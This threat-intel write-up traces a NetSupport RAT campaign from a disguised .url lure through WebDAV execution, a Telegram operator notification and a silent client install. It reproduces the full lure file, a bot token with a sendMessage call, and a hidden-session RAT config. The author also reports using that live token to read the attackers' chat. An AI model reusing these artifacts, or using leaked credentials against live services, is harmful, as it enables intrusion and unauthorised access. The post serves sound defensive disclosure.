---
title: "FUD .url, WebDAV Delivery, and a NetSupport RAT Phoning Home on Telegram"
description: "A Windows URL shortcut disguised as a PDF had 1/75 detections at submission time. It used the WebDAV-over-HTTP UNC trick to silently execute an EXE off a Hong Kong opendir. Two stages later: a silent NetSupport Manager install beaconing to a 16-day-old C2 domain while Telegram told the operator their new victim was live."
pubDate: "2026-07-01T12:00:00"
permalink: "/2026/07/01/fud-url-webdav-netsupport-rat/"
tags: ["Threat Intel", "NetSupport", "RAT", "Phishing", "WebDAV", "Telegram", "Infrastructure", "VirusTotal"]
draft: false
---

[@smica83](https://x.com/smica83) flagged a file with 1/75 detections: `RELEASE FORM.pdf.url`, SHA256 `f141db13…`. The VT label read `HEUR:Trojan.WinINF.Alien.gen` — a single Kaspersky hit. Everything else called it clean.

The `.url` extension is the giveaway. Not a PDF. A Windows Internet Shortcut. When you double-click it, Explorer does not open a browser tab. It connects to a file server, mounts a share, and executes an EXE directly off it. By the time your AV notices, the payload is already running.

Everything below was collected passively: VT, WHOIS, and a lot of reading. No contact with live C2.

---

### The lure

The file is 229 bytes, ASCII, eight lines:

```
[{001261A0-0000-0000-A000-000000001213}]
Prop3=19,2
[InternetShortcut]
IconIndex=11
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
IDList=
URL=file://\\85.11.161.22@80\share\Rate_RATE_AGR_Jun29.exe
HotKey=0
```

Two things are doing work here. First, the icon: `msedge.exe, IconIndex=11` is the default Edge browser shortcut icon — the blue wave. To a user skimming their downloads folder, this looks like a link someone sent them. Not an executable. Not a script.

Second, the URL: `file://\\85.11.161.22@80\share\Rate_RATE_AGR_Jun29.exe`. This is the WebDAV-over-HTTP UNC path trick. Windows' WebClient service interprets `\\server@port\share` as an HTTP WebDAV mount. When Explorer resolves this URL shortcut, it mounts the share over HTTP and executes `Rate_RATE_AGR_Jun29.exe` as if it were a local file. No browser download dialog. No SmartScreen prompt for the `.url` file itself (1/75 means most engines had no signature for it). The payload runs directly from the remote server.

The file names frame this as an HR target. `RELEASE FORM.pdf.url` is what a new-hire documents package looks like. `Rate_RATE_AGR_Jun29.exe` — a rate agreement, dated June 29 — is what you might expect alongside it. Someone in HR or finance who receives a document bundle like this and double-clicks the first file doesn't think twice.

The staging server is `85.11.161.22`, AS207043 Dedik Services Limited, Hong Kong. VT shows one malicious vote from CRDF and one suspicious. The server is hosting the share as an HTTP WebDAV service on port 80.

---

### Stage one: the dropper

`Rate_RATE_AGR_Jun29.exe` (SHA256 `dec98a1ef5d1d…`, 17/75 VT) is a PE32+ x64 executable, 201,728 bytes. The PE timestamp says 2024-07-31 — nearly two years before it was submitted to VT on 2026-06-29. Timestamps this far in the past are almost always forged. Analysts filtering for recent builds in threat-hunting queries drop older timestamps.

The PE has no visible imports. No `GetProcAddress`, no `LoadLibrary` in the import directory — the standard markers that AV heuristics look for. The executable resolves its own API at runtime, which is why 58 out of 75 engines returned nothing. Three RT_RCDATA resources sit in the binary with entropy between 7.13 and 7.84. Those are not images or version manifests. That entropy level means either compression or encryption.

VT's behavioural tags are `detect-debug-environment` and `long-sleeps`. Both are sandbox-evasion markers: the binary checks whether it is running under a debugger or in a VM before doing anything interesting, and it sleeps long enough that short-timeout sandboxes time out without capturing network activity. Sandbox telemetry names the dropped file `C:\Windows\fp914mi.exe` — a random eight-character path in the system directory, chosen at install time. The same technique appeared in the `23172837484.ocx` dropper from [the Chopi investigation](/2026/07/07/chopi-rat-vishing-opendir-pivot/); different actor, same evasion playbook.

When it does run, it calls two external services. The first is `api.telegram.org`. The second is `easyfiles.cc`.

---

### The Telegram knock

Before fetching any payload, the dropper sends a message to a Telegram channel. The full URL captured in VT's behaviour data:

```
https://api.telegram.org/bot8863068816:AAE_841furjQGA3NwEYevapth0at2Jn1b4c/sendMessage
  ?chat_id=@supstuk
  &text=🔔+Knock:+1%0AMode:+1%0ABot:+B58CCD05
```

Decoded, the message is:

```
🔔 Knock: 1
Mode: 1
Bot: B58CCD05
```

The bot token `8863068816:AAE_841furjQGA3NwEYevapth0at2Jn1b4c` is hardcoded in the binary. The `chat_id=@supstuk` in the URL is the target channel. `B58CCD05` is a campaign or victim-tracking ID baked into this build. Every victim that runs this file sends an identical knock. The operator gets a notification the moment the payload executes — before the RAT installs, before C2 connects, just: "someone ran it."

This is a common pattern in lower-sophistication crews. Bot token in plaintext means an analyst who finds the binary can authenticate as the bot and read everything it's seen.

That token is still valid. Running it through [telegram-bot-dumper](https://github.com/RasterSec/telegram-bot-dumper) against the live API pulled the full chat history. The bot's registered username is **`@luciknockbot`** — `@supstuk` is the operator's personal handle, not the bot name. Two Telegram accounts were subscribed to receive knock notifications:

| Handle | Display name | Chat ID |
|---|---|---|
| `@Sup37man` | Aaron Le | 7054829327 |
| `@Suppporttttttt` | Support 2 | 8053867293 |

The knock messages contain the victim's Windows display name. Two confirmed infections as of July 1:

```
Willie Baker    — 2026-07-01 10:23
Daniel Gonzales — 2026-07-01 10:24
```

`@Suppporttttttt` sent `/start` on **2026-06-22** — the day before the first known dropper sample appeared on VirusTotal. That's when the operator wired up the notification channel. Everything since then has been live.

The `luci` prefix in `luciknockbot` is an operator persona marker. "Aaron Le" on `@Sup37man` follows a Vietnamese naming pattern (Le is a common Vietnamese family name), though the display name may be fabricated.

---

### Stage two: easyfiles.cc and NS2H.zip

After sending the knock, the dropper fetches:

```
https://easyfiles.cc/2026/6/ce0a3ffe-dc52-470b-8686-99cd20029255/NS2H.zip
```

`easyfiles.cc` was registered on 2023-06-18 via NameSilo, with Cloudflare nameservers. The A record resolves to `2.56.244.97`, a server in AS216063 (24fire GmbH, Germany). The TLS certificate is a Traefik default — self-generated, no hostname. VT scores the domain 12/91 malicious. Looking at the full list of files that have been observed fetching from this host, it hosts content for dozens of unrelated actors: `.bat` loaders, Minecraft mod `.jar` files, packed EXEs with names like `BOMBA BLYET.exe` and `ConsoleApp1.exe`. This is not dedicated attacker infrastructure. Actors use it because it's cheap, anonymous, and the UUID-based paths can't be enumerated.

`NS2H.zip` (SHA256 `fa33f0af…`, 29/75 VT) expands to a package of files named after a well-known remote-access product:

| File | Role | VT |
|---|---|---|
| `Updatesystem.exe` | Renamed `client32.exe` | 17/76 |
| `htctl32.dll` | NetSupport core DLL | 2/76 |
| `client32.ini` | C2 configuration | 1/75 |
| `NSM.LIC` | NetSupport license | 9/76 |
| `remcmdstub.exe` | Remote command stub | 3/76 |
| `PCICHEK.DLL` | NetSupport PCI DLL | 1/77 |

This is **NetSupport Manager**, a legitimate remote-access product from NetSupport Ltd. Threat actors have been deploying it as a RAT since at least 2018. The legitimate binary is digitally signed, but VT tags `Updatesystem.exe` as `signed` with `invalid-signature` — certificate present, signature doesn't verify. That's typical for repackaged NetSupport builds where something got modified after signing. Kaspersky calls it `not-a-virus:HEUR:RemoteAdmin.Win32.NetSup.gen`. Rising: `PUF.RemoteAdmin!1.E606`. CrowdStrike: grayware at 90% confidence.

The only cosmetic change is the filename. `Updatesystem.exe` in `%TEMP%` doesn't scream "remote access tool" to anyone who isn't already looking for it.

---

### The C2 config: nohakob.icu

`client32.ini` is the configuration file that tells the NetSupport client where to connect. The relevant section:

```ini
[HTTP]
GatewayAddress=nohakob.icu:443
gsk=FH:I?ECFGH<GACDDGF:O=B
gskmode=0
GSK=FH:I?ECFGH<GACDDGF:O=B
GSKX=FH:I?ECFGH<GACDDGF:O=B
SecondaryGateway=45.88.78.28:443
SecondaryPort=443
```

And the install configuration:

```ini
[Client]
AlwaysOnTop=1
DisableChatMenu=1
DisableClientConnect=1
DisableDisconnect=1
DisableGeolocation=1
DisableReplayMenu=1
DisableRequestHelp=1
ShowUIOnConnect=0
silent=1
SKMode=1
SysTray=0
```

Everything that would make the session visible to the victim is switched off. No system tray icon. No connection dialog. No chat menu, no disconnect option, no help request. Room is `Eval` — where NetSupport operators park new victims before sorting them. The GSK is NetSupport's obfuscated gateway authentication token.

`nohakob.icu` was registered **2026-06-13**, sixteen days before `RELEASE FORM.pdf.url` first appeared on VT. Registered via PDR, Cloudflare nameservers, A record pointing to `45.88.78.28`.

`45.88.78.28` is in AS204601 (Peetinvest B.V./Zomro, US), `45.88.78.0/23`. VT has zero malicious detections against it. The hardcoded secondary gateway and the domain's A record both land on the same box. Primary and secondary is the same server with a different label — the failover is cosmetic.

Only two VT-tracked files have ever contacted `nohakob.icu`: the lure and `NS2H.zip`. Single-campaign infrastructure, freshly minted.

---

### Infrastructure map

```
[DELIVERY]
  85.11.161.22 (HK, Dedik Services, AS207043)
    └─ /share/RELEASE FORM.pdf.url   (lure)
    └─ /share/Rate_RATE_AGR_Jun29.exe (stage 1)

[PAYLOAD HOSTING]
  easyfiles.cc → 2.56.244.97 (DE, 24fire GmbH, AS216063)
    └─ /2026/6/ce0a3ffe-.../NS2H.zip  (NetSupport package)

[OPERATOR NOTIFICATION]
  api.telegram.org (Telegram)
    └─ bot 8863068816 → @supstuk channel

[C2 GATEWAY]
  nohakob.icu → 45.88.78.28 (US, NovoServe, AS204601)
    └─ port 443, Room "Eval"
    └─ registered 2026-06-13 (16 days pre-campaign)
```

---

### Shodan pivot: the C2 server and a leaked nickname

Shodan had the server indexed from June 30. It's a Windows box: IIS 10.0 on port 80 returning 403 Forbidden, RPC Endpoint Mapper on port 135, SMB v2 on 445, WS-Discovery on 5357. Port 81 returns a 302 with a full HSTS header block (`max-age=60000`, `Referrer-Policy: no-referrer`, `X-Frame-Options: SAMEORIGIN`) pointing to `https://45.88.78.28:444/`. Port 444 is the NetSupport gateway. No RDP open — the operator gets in some other way.

Reverse DNS resolves to `6147040.ds-b.had.pm`, Zomro B.V.'s internal VPS naming scheme. Peetinvest B.V. is the listed ISP, upstream AS204601.

VT's resolution history for `45.88.78.28` is where it gets interesting. The server wasn't set up for this campaign. It has been running attacker domains since at least April 2026, three months before `RELEASE FORM.pdf.url` appeared:

| Date | Domain | Notes |
|---|---|---|
| 2026-04-19 | `ilush-daddy.icu` | First domain. Registered same day. |
| 2026-05-18 | `ksdfsdkjhodafguidfhqiugdugwdiufh.icu` | Random-string test domain. |
| 2026-06-16 | `nohakob.icu` | Active campaign C2. |

Same registrar (PDR), same Cloudflare nameservers, same `.icu` TLD across all three. Same pattern, same stack, same server.

The test domain WHOIS email goes through `swiftfynd.net`, a disposable mail service registered via Alibaba Cloud HiChina, MX pointing to `temp-mail-pro.com`. Throwaway, not worth chasing.

The first domain is a different story. `ilush-daddy.icu` was registered April 19, the same day VT first saw it resolve to this server. Nobody names a test domain like this for a threat report. **Ilush** (Илюш) is a Russian diminutive of Ilya (Илья), a common Slavic given name. It's the most personal thing the operator left on this infrastructure.

The staging server tells a similar story. Shodan's crawl from June 29 found it running Apache 2.4.66 on Ubuntu, serving the stock Apache default page, last modified June 22 — a week before the campaign. OpenSSH 10.2p1 on port 22. Nothing else visible. The SSH key doesn't appear on any other server Shodan has indexed.

---

### Putting it together

The full chain from double-click to operator control:

1. Victim double-clicks `RELEASE FORM.pdf.url`. Explorer reads the Edge icon. Looks like a browser link.
2. Windows WebClient mounts `\\85.11.161.22@80\share` over HTTP. `Rate_RATE_AGR_Jun29.exe` executes directly from the remote share — no file ever touches the local disk in the conventional download sense.
3. The dropper checks for a debugger. If clean, it sends a Telegram knock to `@supstuk`: "Knock: 1, Mode: 1, Bot: B58CCD05". The operator now knows this victim ran the payload.
4. The dropper fetches `NS2H.zip` from `easyfiles.cc`, extracts it, and installs `Updatesystem.exe` silently in `%TEMP%`.
5. `Updatesystem.exe` (NetSupport Manager client32.exe) connects to `nohakob.icu:443` (port 444 via redirect from port 81) with the encoded GSK. The operator's NetSupport Manager console shows a new machine in the "Eval" room.
6. The operator has full remote desktop, file transfer, shell access, and keystroke logging — all via a legitimate commercial RAT with low AV detection, on a 16-day-old domain that no threat feed has touched.

The lure names point at HR and finance staff specifically — a release form and a rate agreement. This isn't spray-and-pray. The `B58CCD05` campaign ID in the Telegram knock suggests the operator runs multiple campaigns in parallel with separate tracking IDs, probably targeting different industries or regions.

The WebDAV delivery is the part defenders most often miss. The victim receives a 229-byte `.url` file — by email, by chat, by a shared folder link. When they double-click it, the stage-one EXE never downloads. It runs off a network share that mounts over HTTP and unmounts when the session closes. By the time anyone looks at endpoint telemetry, the only local artifact is a tiny shortcut file with one AV detection. The EXE has already run, phoned home, and pulled the NetSupport package.

---

### IOCs

```
# Lure
f141db13721b9f0248e4eb482bd0462995c920595ed9e87e704f841543f63621  RELEASE FORM.pdf.url

# Stage 1
dec98a1ef5d1d1b5a6aa886345de1ac4adcea5829509e375b7cf87b7a22fb91d  Rate_RATE_AGR_Jun29.exe
  imphash: ca7cf48965e5612a16429deba2029941

# Stage 2 (NS2H package)
fa33f0af6511c3e0023d4960fb3f046a09c0e5ae6261d396789baf147ca328a5  NS2H.zip
46c40af9624ba9be8af28cfc7d3847552a93089b4b4db07a66547081f29f9891  Updatesystem.exe (client32.exe)
6562585009f15155eea9a489e474cebc4dd2a01a26d846fdd1b93fdc24b0c269  htctl32.dll
e8cf924da6401e02f96c4639f257d410b2a6d4e8d5f6650ea9d57cbb4c758cff  client32.ini
1dda2a0a0bab08a23b976c0314e7cdb9b8e6732910df5c53692f92a7abc4b562  NSM.LIC
3f9cdacaf03050325aa554e4f7bc769ce2fe9554a06237a1ec8a191bade0bf18  remcmdstub.exe
45532e8ecdccca684dd3b492c58485b0b2987893f5c7a3590c60f5fcaec4a27c  PCICHEK.DLL

# Infrastructure
85.11.161.22              staging opendir (Ubuntu Apache, prov. 2026-06-22, Dedik Services AS207043)
2.56.244.97               easyfiles.cc host (DE, 24fire GmbH, AS216063)
45.88.78.28               NetSupport C2 IP (Windows, Peetinvest/Zomro, AS204601)
nohakob.icu               active C2 domain (PDR/Cloudflare, reg. 2026-06-13, → 45.88.78.28)

# Historical domains on same C2 server (45.88.78.28)
ilush-daddy.icu           first test domain (PDR/Cloudflare, reg. 2026-04-19) — operator nickname "ilush"
ksdfsdkjhodafguidfhqiugdugwdiufh.icu  random-string test domain (PDR, reg. 2026-05-18)

# Telegram
bot token:   8863068816:AAE_841furjQGA3NwEYevapth0at2Jn1b4c
bot username: @luciknockbot
operator handles: @Sup37man (Aaron Le, ID 7054829327), @Suppporttttttt (Support 2, ID 8053867293)
notification target: @supstuk
campaign ID: B58CCD05
confirmed victims: Willie Baker, Daniel Gonzales (machine display names, 2026-07-01)

# GSK (obfuscated, NetSupport gateway auth)
FH:I?ECFGH<GACDDGF:O=B
```

---

### Detection notes

A `file://\\host@port\share\` URL inside a `.url` file is a reliable detection signal — legitimate software does not deliver programs this way. The NetSupport components are identifiable by their PE version info and import hash even when renamed. The Telegram bot token is static across the life of a campaign and can be blocklisted at the network layer. `nohakob.icu` was 0/91 on VT at investigation time but should be considered malicious given the totality of context. The historical domains `ilush-daddy.icu` and `ksdfsdkjhodafguidfhqiugdugwdiufh.icu` resolve to the same C2 server and should also be blocked — their Shodan fingerprint (IIS 10.0 on port 80, NetSupport gateway on port 444 via port-81 redirect) is sufficiently specific to use for pivot hunting in network logs.
